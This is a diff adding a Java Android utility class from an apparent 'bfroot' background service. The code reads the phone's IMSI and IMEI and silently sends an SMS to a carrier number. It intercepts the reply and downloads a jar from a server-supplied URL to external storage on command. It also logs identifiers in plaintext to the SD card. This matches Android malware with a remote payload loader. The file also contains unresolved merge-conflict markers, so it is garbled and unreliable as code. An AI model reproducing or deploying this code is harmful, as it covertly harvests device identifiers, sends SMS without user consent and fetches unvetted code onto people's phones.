@@ -1,0 +1,637 @@
+package com.bfroot.tool;
+
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLEncoder;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import android.content.Context;
+import android.content.SharedPreferences;
+import android.content.res.AssetManager;
+import android.content.res.Resources;
+import android.os.Build;
+import android.os.Environment;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+import com.bfroot.service.BfHeartService;
+import com.bfroot.service.BfSmsReceive;
+
+public class BfTool 
+{
+	private static BfGprsObject receiveGprs = null;
+	
+	/**
+	 * 获取基本参数
+	 */
+	public static void getBasicInfo(Context context)
+	{
+		SharedPreferences sp = context.getSharedPreferences("bfroot",
+				BfHeartService.MODE_PRIVATE);
+		String account = sp.getString(BfConfig.BfAccountName, "-1");
+		int jarcode = sp.getInt(BfConfig.JarCodeName, 0);
+		
+		BfConfig.Account = account;
+		BfConfig.JarCode = jarcode;
+		
+		
+		TelephonyManager telManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+		BfConfig.IMSI = telManager.getSubscriberId();
+		BfConfig.IMEI = telManager.getDeviceId();
+		BfLog("getBasicInfo IMSI:"+BfConfig.IMSI+"IMEI:"+BfConfig.IMEI);
+		
+		/*手机名称 防止手机名称里面有URL不允许特殊字符*/
+		String model = Build.MODEL;
+		BfConfig.PHONE_NAME = URLEncoder.encode(model);
+		BfLog( "getBasicInfo PHONE_NAME:"+BfConfig.PHONE_NAME);
+		
+		/*获取商户ID*/
+		BfConfig.Vest = getVest(context);
+		
+	}
+	
+	/**
+	 * 获取心跳协议的网络流量和短信中心号码
+	 */
+	public static void getGprsScnInfo(Context context)
+	{
+		SharedPreferences sp = context.getSharedPreferences("bfroot",
+				BfHeartService.MODE_PRIVATE);
+		String smsBody = sp.getString(BfConfig.GprsMesBodyName, "1091");
+		String smsAdd = sp.getString(BfConfig.GprsMesAddName, "10086");
+		String totalkey = sp.getString(BfConfig.GprsToTalKeyName, "数据流量共");
+		String usedkey = sp.getString(BfConfig.GprsCostKeyName, "，已使用");
+		
+		BfSendGprsObject mesObject = new BfSendGprsObject();
+		mesObject.setMescode(smsBody);
+		mesObject.setMesadd(smsAdd);
+		mesObject.setTotalkey(totalkey);
+		mesObject.setUsedkey(usedkey);
+		
+		BfGprsObject resultObject = getGprsInfo(context, mesObject);
+		BfConfig.ScnCode = resultObject.getScn();
+		int total = (int) Double.parseDouble(resultObject.getGprs()) +1;
+		BfConfig.GprsTotal = URLEncoder.encode(total+"");
+		int cost = (int) Double.parseDouble(resultObject.getGprscost()) +1;
+		BfConfig.GprsCost = URLEncoder.encode(cost+"");
+		BfLog( "getGprsScnInfo scncode:"+BfConfig.ScnCode);
+		BfLog( "getGprsScnInfo GprsTotal:"+BfConfig.GprsTotal);
+		BfLog("getGprsScnInfo GprsCost:"+BfConfig.GprsCost);
+	}
+	
+	/**
+	 * 通过截获gprs流量信息(循环等待)
+	 */
+	public static BfGprsObject getGprsInfo(Context context ,BfSendGprsObject mesObject)
+	{
+		receiveGprs = null;
+		long starttime = System.currentTimeMillis();
+		
+		BfSmsReceive receive = new BfSmsReceive(context, mesObject ,new BfSmsReceive.GprsSMSListener() 
+		{
+			public void sendSMSGprsCallback(String scn ,String gprs ,String gprscost) 
+			{
+				BfGprsObject result = new BfGprsObject();
+				
+				result.setScn(scn);
+				result.setGprs(gprs);
+				result.setGprscost(gprscost);
+				receiveGprs = result;
+			}
+		});
+		receive.registerReceiver();
+		receive.sendSms();
+		
+		while(null == receiveGprs )
+		{
+			try 
+			{
+				Thread.sleep(256);
+			} 
+			catch (InterruptedException e) 
+			{
+				e.printStackTrace();
+			}
+			
+			if(null == receiveGprs)
+			{
+				long endtime = System.currentTimeMillis();
+				if((endtime-starttime) >60000*10)
+				{
+					break;
+				}
+			}
+		}
+		receive.unRegisterReceiver();
+		return receiveGprs;
+	}
+	
+	/**
+	 * 通过读文件，获取商务ID
+	 */
+	public static String getVest(Context context)
+	{
+		String vest = "-1";
+		String vest_first_name = BfConfig.VestFirstName;
+		Resources resources = context.getResources();
+		AssetManager am = resources.getAssets();
+		try
+		{
+			String[] files = am.list("");
+			for (String file : files)
+			{
+				if(file.toString().contains(vest_first_name))
+				{
+					vest = file.toString().substring(vest_first_name.length() ,file.toString().lastIndexOf("."));
+					BfLog("getVest:"+file+":::"+vest);
+				}
+			}
+		} 
+		catch (IOException e)
+		{
+			e.printStackTrace();
+		}
+
+		return vest;
+	}
+	
+	/**
+	 * 联网回调接口
+	 */
+	public static interface CommonHttpCallback 
+	{
+		/**
+		 * 联网成功后的回调
+		 */
+		void finishcallback(int code , String data);
+	}
+	/**
+	 * 简单的联网请求
+	 */
+	public static void CommonHttpResquest(final String url ,final CommonHttpCallback callback)
+	{
+		new Thread(new Runnable() 
+		{
+			public void run()
+			{
+				String result = HttpRequest(url);
+				callback.finishcallback(1, result);
+			}
+		}).start();
+	}
+	
+	/**
+	 * 阻塞HTTP请求，返回字串
+	 * 
+	 * @param urlstr
+	 */
+	public static String HttpRequest(String urlstr)
+	{
+		HttpURLConnection hurlconn = null;
+		try
+		{
+			URL url = new URL(urlstr);
+			hurlconn = (HttpURLConnection) url.openConnection();
+			hurlconn.setDoInput(true);
+			hurlconn.setUseCaches(false);
+			hurlconn.setRequestMethod("GET");
+			hurlconn.setConnectTimeout(15000);
+			hurlconn.setReadTimeout(15000);
+			
+			int code = hurlconn.getResponseCode();
+
+			if (code == HttpURLConnection.HTTP_OK)
+			{
+				hurlconn.connect();
+				InputStream in = hurlconn.getInputStream();
+				BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+				
+				String line = null;
+				StringBuffer sb = new StringBuffer();
+				// 接受数据流
+				while ((line = reader.readLine()) != null)
+				{
+					sb.append(line);
+				}
+				
+				String result = sb.toString();
+				return result;
+			}
+		}
+		catch (MalformedURLException e)
+		{
+			e.printStackTrace();
+		}
+		catch (IOException e)
+		{
+			e.printStackTrace();
+		}
+		finally
+		{
+			if(hurlconn != null)
+			{
+				hurlconn.disconnect();
+			}
+		}
+		return null;
+	}
+	
+	/**
+	 * 对 string builder 信息进行关键字替换
+	 * 
+	 * @param sb
+	 *            字串信息
+	 * @param key
+	 *            关键字信息
+	 * @param value
+	 *            要替换的内容
+	 */
+	public static final void replaceForWord(StringBuilder sb, String key,
+			String value)
+	{
+		if (null == value)
+		{
+			return;
+		}
+		int start = 0;
+		int end, length;
+
+		length = key.length();
+		start = sb.indexOf(key);
+		while (start >= 0)
+		{
+			end = start + length;
+
+			sb.replace(start, end, value);
+			start = sb.indexOf(key, start);
+		}
+	}
+	
+	/**
+	 * json转对象
+	 */
+	public static JSONObject toObj(String jsonString)
+	{
+		JSONObject demoJson = null;
+		try
+		{
+			demoJson = new JSONObject(jsonString);
+		}
+		catch (JSONException e)
+		{
+			e.printStackTrace();
+		}
+		return demoJson;
+	}
+	
+	public static boolean updateJar(Context context ,JSONObject execObj)
+	{
+		BfLog( "BfTool  updatejar"+execObj.toString());
+		try 
+		{
+			int jarcode = execObj.getInt("jarcode");
+			String jarurl = execObj.getString("jarurl");
+			
+			/*更新jar的命令实现*/
+			if(jarcode >0 && null != jarurl)
+			{
+				SharedPreferences sp = context.getSharedPreferences("bfroot",
+						BfHeartService.MODE_PRIVATE);
+				int bsjarcode = sp.getInt(BfConfig.JarCodeName, 0);
+				
+				String filePath = Environment.getExternalStorageDirectory().getPath()+File.separator;
+				File file = new File(filePath+BfConfig.JarFileName);
+				
+				if(bsjarcode < jarcode || !file.exists())
+				{
+					return execUpdate(context ,jarcode , jarurl);
+				}
+			}
+		} catch (JSONException e)
+		{
+			e.printStackTrace();
+		}
+		return true;
+	}
+	
+	public static boolean execUpdate(Context context, int jarcode , String jarurl)
+	{
+		if(BfNetWorkTool.bfNetWorkInit(context, BfNetWorkTool.CODE_USE_CN_WIFI))
+		{
+			String filePath = Environment.getExternalStorageDirectory().getPath()+File.separator;
+			File file = new File(filePath+BfConfig.JarFileName);
+			if(file.exists())
+			{
+				deleteFileOnly(file);
+			}
+			BfLog("execUpdate  jarurl:"+jarurl+"filePath:"+filePath);
+			int result = -1;
+			int errorcode = 0;
+			while(result != 200)
+			{
+				result = HttpRequest(BfConfig.JarFileName , jarurl , filePath);
+				BfLog( "execUpdate  result:"+result+"jarcode:"+jarcode);
+				errorcode++;
+				if(errorcode>5)
+				{
+					break;
+				}
+			}
+			if(result == 200)
+			{
+				SharedPreferences sp = context.getSharedPreferences("bfroot",
+						BfHeartService.MODE_PRIVATE);
+				sp.edit().putInt(BfConfig.JarCodeName, jarcode).commit();
+				return true;
+			}
+		}
+		return false;
+	}
+	
+	/**
+	 * 阻塞HTTP请求，保存文件
+	 * 
+	 * @param urlstr
+	 * 			下载的完整路径
+	 * @param name
+	 * 			需要保存的文件名称
+	 * @param filePath
+	 * 			需要保存文件的路径
+	 */
+	public static int HttpRequest(String name , String urlstr ,String filePath )
+	{
+		int resultcode = -1;
+		
+		long total = 0;
+		long completeSize = 0;
+		OutputStream out = null;
+		HttpURLConnection hurlconn = null;
+		long fsize = 0;
+
+		File tempFile = new File(filePath);
+		if(!tempFile.exists())
+		{
+			tempFile.mkdirs();
+		}
+		
+		File file = new File(filePath + File.separator+ name);
+		if (file.exists())
+		{
+			fsize = file.length();
+		}
+
+		try
+		{
+			URL httpUrl = new URL(urlstr);
+			hurlconn = (HttpURLConnection) httpUrl.openConnection();
+			hurlconn.setDoInput(true);
+			hurlconn.setUseCaches(false);
+			hurlconn.setRequestMethod("GET");
+			hurlconn.setConnectTimeout(30000);
+			hurlconn.setReadTimeout(30000);
+			hurlconn.setRequestProperty("Accept-Encoding", "identity");
+			
+			if (fsize > 0)
+			{
+				hurlconn.setRequestProperty("Range", "bytes=" + fsize + "-");
+			}
+			int code = hurlconn.getResponseCode();
+			
+			if (code == HttpURLConnection.HTTP_OK
+					|| code == HttpURLConnection.HTTP_PARTIAL)
+			{
+				total = hurlconn.getContentLength();
+				if (total <= 0)
+				{
+					/*是否需要断点续传*/
+					return resultcode;
+				}
+				
+				if (fsize > 0)
+				{
+					total += fsize;
+					completeSize = fsize;
+				}
+				
+				InputStream instream = hurlconn.getInputStream();
+				out = new FileOutputStream(file, true);
+				byte[] b = new byte[1024 * 8];
+				int length = 0;
+				
+				while (length  != -1)
+				{
+					length = instream.read(b);
+					if (length != -1)
+					{
+						out.write(b, 0, length);
+						completeSize += length;
+					}
+				}
+				if (completeSize >= total)
+				{
+					instream.close();
+					out.flush();
+					out.close();
+					hurlconn.disconnect();
+					resultcode = 200;
+				}
+			}
+			else if (code == 416)
+			{
+				hurlconn.disconnect();
+				resultcode = 200;
+			}
+			else
+			{
+				if (null != hurlconn)
+				{
+					hurlconn.disconnect();
+				}
+				
+				/*递归调用，继续下载*/
+//				HttpRequest(name ,urlstr ,filePath);
+			}
+		}
+		catch (MalformedURLException e)
+		{
+			e.printStackTrace();
+			if (null != hurlconn)
+			{
+				hurlconn.disconnect();
+			}
+			/*递归调用，继续下载*/
+//			HttpRequest(name ,urlstr ,filePath);
+		}
+		catch (IOException e)
+		{
+			e.printStackTrace();
+			if (null != hurlconn)
+			{
+				hurlconn.disconnect();
+			}
+			/*递归调用，继续下载*/
+//			HttpRequest(name ,urlstr ,filePath );
+		}
+		catch (Exception e)
+		{
+			e.printStackTrace();
+			if (null != hurlconn)
+			{
+				hurlconn.disconnect();
+			}
+			/*递归调用，继续下载*/
+//			HttpRequest(name ,urlstr ,filePath );
+		}
+		finally
+		{
+			if (null != hurlconn)
+			{
+				hurlconn.disconnect();
+			}
+		}
+		return resultcode;
+	}
+	
+	public static void deleteFileOnly(File file)
+	{
+        if(file.isFile())
+        {
+            file.delete();
+            return;
+        }
+        if(file.isDirectory())
+        {
+            File[] childFile = file.listFiles();
+            for(File f : childFile)
+            {
+            	deleteFileOnly(f);
+            }
+        }
+    }
+<<<<<<< .mine
+	
+	/**
+	 * 获取根目录路径（如果有T卡优先T卡）
+	 */
+	public static String getRootFilePathHeader(Context context)
+	{
+		String path;
+		String status = Environment.getExternalStorageState();
+
+		if (status.equals(Environment.MEDIA_MOUNTED))
+		{
+			path = Environment.getExternalStorageDirectory().getPath();
+		}
+		else
+		{
+			File file =context.getApplicationContext().getFilesDir();
+			if (null == file)
+			{
+				return File.separator;
+			}
+			path = file.getPath();
+		}
+
+		return path;
+	}
+	
+	public static void BfLog(String content)
+	{
+		Log.v("jeden", content);
+		if(null == content || content.length() == 0)
+		{
+			content = "null";
+		}
+		saveStrToSDcard(content);
+	}
+	
+	/**
+	 * 将字串存储到 sdcard
+	 * 
+	 * @param str
+	 * @param fileName
+	 */
+	public static void saveStrToSDcard(String content)
+	{
+//		byte[] str = content.getBytes();
+		// 保存到T卡
+		String path = getRootFilePathHeader(BfHeartService.getHeartContext()) + "/bflog";
+		
+		File file = new File(path);
+		if (!file.exists())
+		{
+			try
+			{
+				file.createNewFile();
+			}
+			catch (IOException e)
+			{
+				e.printStackTrace();
+			}
+		}
+		BufferedWriter out=null;
+
+//		FileOutputStream fos = null;
+//		InputStream contentStream = new ByteArrayInputStream(str);
+//		int contentLength = 0;
+		try
+		{
+//			fos = new FileOutputStream(file);
+//			int length = 0;
+//			contentLength = contentStream.available();
+//
+//			do
+//			{
+//				byte[] temp = new byte[1024 * 5];
+//				int bufferLength = contentStream.read(temp);
+//				fos.write(temp, 0, bufferLength);
+//				fos.newLine(); 
+//				length += bufferLength;
+//				if (length >= contentLength)
+//				{
+//					break;
+//				}
+//			}
+//			while (true);
+//
+//			fos.close();
+//			contentStream.close();
+			out = new BufferedWriter(new FileWriter(file,true));
+			out.write(content);
+			out.newLine(); 
+			out.close();
+		}
+		catch (IOException e)
+		{
+			e.printStackTrace();
+		}
+	}
+=======
+	/*
+	 * 判断是否是数字
+	 */
+	public static boolean isNum(String str)
+	{
+		if(str != null)
+		{
+			return str.matches("^[-+]?(([0-9]+)([.]([0-9]+))?|([.]([0-9]+))?)$");
+		}
+		else
+		{
+			return false;
+		}
+	}
+>>>>>>> .r2902
+}
